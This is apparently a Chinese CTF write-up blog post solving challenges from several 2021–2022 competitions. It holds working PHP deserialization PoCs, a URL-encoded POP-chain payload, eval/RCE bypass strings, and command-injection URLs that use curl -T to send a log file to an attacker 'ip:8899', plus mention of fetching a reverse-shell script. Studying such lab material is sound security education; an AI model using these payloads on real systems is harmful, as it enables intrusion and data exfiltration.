---
title: 各比赛签到记录
id: 各比赛签到记录

---

<!-- more -->


## 2021春秋杯勇者山峰

![](https://s2.loli.net/2022/03/15/9GPNuZpKdfxjTJv.png)

### misc

#### 问卷调查

完成问卷即可

#### Vigenere

```
cvnwvk lqae bw wzgy czxrxlm gnaoiiaafy. am ara xaufwiu qf fwg mlfckmnv tru aajtwxr pmsd afw rfe zms ehvv bzmn lpiebq yeeuiia. zq hsl qrvq keskw fn jqswtvtp wjpwkmvvuq afw lzoz feuarzksx lwoic qf unxhvdiluof litcjutq. amj usun jxwvijoh vbvvkluofl mekdgdw iiemldalbse bwetagk, imnqrkx ieoazewkmeo, tunskc jmugramc, tzqbtgzvrxzk afw wf wf. fhw miru zms ohr kpw fhakh gzale ag xym kqcggh eiluoftp zvvgslkmrt Aztwkrvb kqcmkmkg lqczgscwyk scbpca uamhxxzbaan, lai zvxaretxzwf eeunvzbq fratxytgz tjtmeqfs csft, rvv fhw litwfp pjbdv qf fhw "zyrv'sz cmi" qrvsseexrk whqrsmmfv szd etmebwzafvi twebelbxzwf af alk emliojd wvkmdilr wbqdxs uhqgmlutahr.tlmeeu pickgye qhy, kicq ygnv wtss:53d613xv-6g5t-4lv6-n3cw-8ug867t6n648
```

没给密钥，不过网上也有破解脚本，也有在线网站

[vigenere-solver](https://www.guballa.de/vigenere-solver)

```
cdusec team is from chengdu university. it was founded in two thousand and sixteen year and now has more than twenty members. he has many years of research experience and high technical level in information security. his main research directions include penetration testing, reverse engineering, binary security, cryptography and so on. the team has won the third prize in the second national industrial Internet security technology skills competition, the information security triathlon training camp, and the second prize in the "guan'an cup" management operation and maintenance competition of isg network security skills competition.cdusec welcome you, take your flag:53d613fc-6c5c-4dd6-b3ce-8bc867c6f648
```



### web



#### unser_name

学到挺多的==

`www.zip`源码泄漏

```php
# exists.php

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="stylesheet" type="text/css" href="js_css/exists.css">
    <title>exists</title>
</head>

<body>
<div class="box">
<form action="exists.php" method="get">
    <input placeholder="文件名" type="text" id="text" name="filename">
</form>
</div>
</body>
</html>
<?php
class name1{
    public $var;
    public function __destruct(){
        echo $this->var;
    }
}
class name2{
    public function __toString(){
        $_POST["func"]();
        return "";
    }
}
header("Content-type: text/html;charset=utf-8");
$ip=$_SERVER['REMOTE_ADDR'];
$find_this = create_function("", 'die(`cat /flag`);');
error_reporting(0);
$filename = $_GET['filename'];
if (!$_GET['ip']){
    echo $ip;
}
if ($filename == NULL){
   die();
}
if (file_exists($filename)){
    echo '<script type="text/javascript">alert("该文件存在");</script>';
}
else{
    echo '<script type="text/javascript">alert("该文件不存在");</script>';
}


```



```php
# upload.php

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="stylesheet" type="text/css" href="js_css/upload.css">
    <title>upload</title>
</head>
<body>
<div class="box">
    <form action="upload.php" method="post" enctype="multipart/form-data">
        <input type="file" name="file" id="file" class="inputfile" data-multiple-caption="{count} files selected" multiple />
        <label for="file"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="17" viewBox="0 0 20 17"><path d="M10 0l-5.2 4.9h3.3v5.1h3.8v-5.1h3.3l-5.2-4.9zm9.3 11.5l-3.2-2.1h-2l3.4 2.6h-3.5c-.1 0-.2.1-.2.1l-.8 2.3h-6l-.8-2.2c-.1-.1-.1-.2-.2-.2h-3.6l3.4-2.6h-2l-3.2 2.1c-.4.3-.7 1-.6 1.5l.6 3.1c.1.5.7.9 1.2.9h16.3c.6 0 1.1-.4 1.3-.9l.6-3.1c.1-.5-.2-1.2-.7-1.5z"/></svg> <span>Choose a file&hellip;</span></label>
        <input type="submit" name="bu" class="bu" value="提交">
    </form>
</div>
<script src="js_css/upload.js"></script>
</body>
</html>
<?php
header("Content-type: text/html;charset=utf-8");
error_reporting(0);

function uploadfile(){
    global $_FILES;
    if (uploadfilecheck() && black_key_check()){
        $name = md5("cdusec".$_SERVER["REMOTE_ADDR"]).".gif";
        if(file_exists("upload_file/").$name){
            unlink($name);
        }
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload_file/".$name);
        echo "<script type='text/javascript'>alert('ok');</script>";
    }

}

function black_key_check(){
	$phar_magic="__HALT_COMPILER";
	$zip_magic="PK\x03\x04";
	$gz_magic="\x1f\x8b\x08";
	$bz_magic="BZh";
	$contents = file_get_contents($_FILES["file"]["tmp_name"]);
	if(strpos($contents,$phar_magic)!==false){
		return false;
	}
	if($zip_magic===substr($contents,0,4)){
		return false;
	}
	if($gz_magic===substr($contents,0,3)){
		return false;
	}
	if($bz_magic===substr($contents,0,3)){
		return false;
	}
	exec("tar -tf ".$_FILES["file"]["tmp_name"],$r_array);
	if(in_array(".phar/.metadata",$r_array)){
		return false;
	}
	return true;
}


function uploadfilecheck(){
    global $_FILES;
    $allowedExts = array("gif","jpeg","jpg","png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (empty($extension)){
    }else{
        if (in_array($extension,$allowedExts)){
            return true;
        }else{
            echo '<script type="text/javascript">alert("no");</script>';
            return false;
        }
    }
}
uploadfile();
?>


```



显而易见的phar反序列化了

第一个考点有点`虎符线下tinypng`的影子，但是多了一些东西

参考：

[从虎符线下CTF深入反序列化利用 | (guokeya.github.io)](https://guokeya.github.io/post/uxwHLckwx/)

![](https://i.loli.net/2021/11/27/WPFkV8aJs7iUbnc.png)

phar是必须要有`__HALT_COMPILER();`来让其识别的

因为对内容检测，那么正常的phar肯定不行了，其次gzip、zip、bzip2是基于源码直接检测前几位，也绕不过

但在tar倒是存在突破口

```php
# tar  -t 列出备份文件的内容 -f 备份文件
exec("tar -tf ".$_FILES["file"]["tmp_name"],$r_array);

# 使用的是in_array
if(in_array(".phar/.metadata",$r_array)){
    return false;
}
```

就是复制一份上传文件，然后以数组形式返回其内容到$r_array中

in_array的检测不同于正则，匹配的是完整字符串，像这样参杂字符就能绕过`.phar/.metadata111`

![](https://i.loli.net/2021/11/27/hZsRSEVNqxoMr3D.png)

然后再看为啥这样也能被解析，涉及到php的底层源码

还是截自[从虎符线下CTF深入反序列化利用 | (guokeya.github.io)](https://guokeya.github.io/post/uxwHLckwx/)

![](https://i.loli.net/2021/11/29/DJwPr5XSERzUTl3.png)



反序列化的类很简单就不细说了，poc如下：

```php
<?php
class name1{
    public $var;
    public function __construct(){
        $this->var = new name2();
    }
}
class name2{
    public function __toString(){
        $_POST["func"]();
        return "";
    }
}

$a = new name1();

@unlink("phar.tar");
@system('rm -r .phar');
@system('mkdir .phar');
file_put_contents('.phar/.metadata111',serialize($a));
system('tar -cf phar.tar .phar/.metadata111');

```

会对上传文件的后缀进行检测，改为`"gif","jpeg","jpg","png"`即可



```php
function uploadfile(){
    global $_FILES;
    if (uploadfilecheck() && black_key_check()){
        $name = md5("cdusec".$_SERVER["REMOTE_ADDR"]).".gif";
        if(file_exists("upload_file/").$name){
            unlink($name);
        }
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload_file/".$name);
        echo "<script type='text/javascript'>alert('ok');</script>";
    }

}
```

上传后的文件会被重命名，不过源码都给出来了自己跑一下就行

![](https://i.loli.net/2021/11/27/wj7JFY8bRz6VxpD.png)

![](https://i.loli.net/2021/11/27/LOHVZGjk8dfEq9m.png)



然后就可以触发反序列化，会调用`$_POST["func"]();`
![](https://i.loli.net/2021/11/27/d6I8GAzhaYLJP4V.png)



然后就是关于create_function()的考点

[PHP： create_function](https://www.php.net/manual/zh/function.create-function)

也可以根据关键代码搜到~：

```php
create_function("", 'die(`cat /flag`);');
```

> [[SUCTF 2018\]annonymous – 「配枪朱丽叶。」 (shawroot.cc)](https://www.shawroot.cc/631.html)
>
> 
>
> create_function生成的函数名有些特殊，它是`NULL字符加上”lambda_”再加个一个数字标识（\x00lambda_数字标识）`，其中数字标识代表它是当前进程中的第几个匿名函数。create_function的实现步骤如下：
>
> 1. 获取参数, 函数体
> 2. 拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串
> 3. eval之
> 4. 通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错
> 5. 定义一个函数名:”\000_lambda_” . count(anonymous_functions)++
> 6. 用新的函数名替换__lambda_func
> 7. 返回新的函数名

那么遍历一下该数字即可

![](https://i.loli.net/2021/11/27/WsQrIM6OqZmoevH.png)









## ctfshow-摆烂杯

### 一行代码

```php
<?php
    echo !(!(include "flag.php")||(!error_reporting(0))||stripos($_GET['filename'],'.')||($_GET['id']!=0)||(strlen($_GET['content'])<=7)||(!eregi("ctfsho".substr($_GET['content'],0,1),"ctfshow"))||substr($_GET['content'],0,1)=='w'||(file_get_contents($_GET['filename'],'r') !== "welcome2ctfshow"))?$flag:str_repeat(highlight_file(__FILE__), 0);
```



```php
<?php 
show_source(__FILE__);

if (!(stripos($_GET['filename'],'.') || ($_GET['id']!=0) || (strlen($_GET['content'])<=7) || (!eregi("ctfsho".substr($_GET['content'],0,1),"ctfshow")) || substr($_GET['content'],0,1)=='w' || (file_get_contents($_GET['filename'],'r') !== "welcome2ctfshow"))){
    print("yes");
}

// echo 
// !(
// !(include "flag.php")  ||  
// (!error_reporting(0))  ||  
// stripos($_GET['filename'],'.')  ||      #要有点
// ($_GET['id']!=0)  ||                    #id=0
// (strlen($_GET['content'])<=7)  ||       #长度大于7
// (!eregi("ctfsho".substr($_GET['content'],0,1),"ctfshow"))  ||
// substr($_GET['content'],0,1)=='w'  ||
// (file_get_contents($_GET['filename'],'r') !== "welcome2ctfshow")
// )
// ?
// $flag
// :
// str_repeat(highlight_file(__FILE__), 0);

// ?filename=data://text/plain,welcome2ctfshow&id=0&content=%00waaaaaaa
```





## 长安战疫

### RCE_No_Para

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
    if(!preg_match('/session|end|next|header|dir/i',$_GET['code'])){
        eval($_GET['code']);
    }else{
        die("Hacker!");
    }
}else{
    show_source(__FILE__);
}

?>
```

常用的payload都废掉了，想办法rce：

将数组的键名和键值对调，然后把他单独获取出来再eval
这里要把执行的参数第一个传~

```
?a=system('ls');&code=eval(array_rand(array_flip(current(get_defined_vars()))));

?a=system('tac flag.php');&code=eval(array_rand(array_flip(current(get_defined_vars()))));
```



## ctfshow-卷王杯

### easyweb

[php绕过数组赋值 - CSDN](https://www.csdn.net/tags/OtDaEgzsMzg4ODQtYmxvZwO0O0OO0O0O.html)

[PHP 原生类在 CTF 中的利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/238482#h3-22)

```php
<?php
error_reporting(0);
if(isset($_GET['source'])){
    highlight_file(__FILE__);
    echo "\$flag_filename = 'flag'.md5(???).'php';";
    die();
}
if(isset($_POST['a']) && isset($_POST['b']) && isset($_POST['c'])){
    $c = $_POST['c'];
    $count[++$c] = 1;
    if($count[] = 1) {
        $count[++$c] = 1;
        print_r($count);
        die();
    }else{
        $a = $_POST['a'];
        $b = $_POST['b'];
        echo new $a($b);
    }
}
?>
```

利用数组越界报错的漏洞绕过die()：

利用原生类DirectoryIterator搭配伪协议glob找到flag文件，这里记得用通配符，他本身有个flag.php迷惑的

```
a=DirectoryIterator&b=glob://./flag?*.php&c=9223372036854775806
```

再利用原生类SplFileObject读文件即可

```
a=SplFileObject&b=flag56ea8b83122449e814e0fd7bfb5f220a.php&c=9223372036854775806
```





## 2022DASCTF X SU 三月春季挑战赛

### ezpop

```php
<?php

class crow
{
    public $v1;
    public $v2;

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;

    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' . $this->m1);
    }

}

if (isset($_POST['cmd'])) {
    unserialize($_POST['cmd']);
} else {
    highlight_file(__FILE__);
}
```

简单的pop链
`eval('#' . $this->m1);`换行绕过即可

poc如下：

```php
<?php
class crow
{
    public $v1;
    public $v2;
}

class fin
{
    public $f1;
}

class what
{
    public $a;
}
class mix
{
    public $m1;
}

//fin __destruct() -> what __toString() -> mix run() -> crow __invoke

$a = new fin();
$a->f1=new what();
$a->f1->a=new mix();
$a->f1->a->m1=new crow();
$a->f1->a->m1->v1=new fin();
$a->f1->a->m1->v1->f1=new mix();
$a->f1->a->m1->v1->f1->m1="
system('tac *');";
echo urlencode(serialize($a));
```

这里flag在当前目录下，有好几个文件，直接读完就行

payload：

```
O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A18%3A%22%0D%0Asystem%28%27tac+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D
```

![](https://s2.loli.net/2022/03/26/lQU6GCyXRY9DbiB.png)



### calc（赛后）

```python
#coding=utf-8
from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
import random
from urllib import parse
import os
from werkzeug.utils import secure_filename
import time


app=Flask(__name__)

def waf(s):
    blacklist = ['import','(',')',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag= False
            print(no)
            break
    return flag
    

@app.route("/")
def index():
    "欢迎来到SUctf2022"
    return render_template("index.html")

@app.route("/calc",methods=['GET'])
def calc():
    ip = request.remote_addr
    num = request.values.get("num")
    log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip,num)
    
    if waf(num):
        try:
            data = eval(num)
            os.system(log)
        except:
            pass
        return str(data)
    else:
        return "waf!!"

if __name__ == "__main__":
    app.run(host='0.0.0.0',port=5000)  

```

关键看

```python
data = eval(num)
os.system(log)
```

需要eval计算不报错，才能利用os.system来执行命令，用`#`注释掉就行

然后就是类似无回显rce，可以考虑curl到vps：

```
url/calc?num=123%23`curl%09ip:8899`
```

不过当时想不出咋带，后面学习了一下curl的用法

可以看看这篇：[绕过限制利用curl读取写入文件](https://www.anquanke.com/post/id/98896)

因为结果会被写入到/tmp/log.txt，可以利用curl -T带出来

```
url/calc?num=123%23`ls%09/`

url/calc?num=123%23`cat%09/Th1*`

url/calc?num=123%23`curl%09-T%09/tmp/log.txt%09ip:8899`
```

![](https://s2.loli.net/2022/04/18/falSeBvE9MzZjOn.png)

也可以考虑wget一个反弹shell的sh文件然后执行，注意要放到可写目录
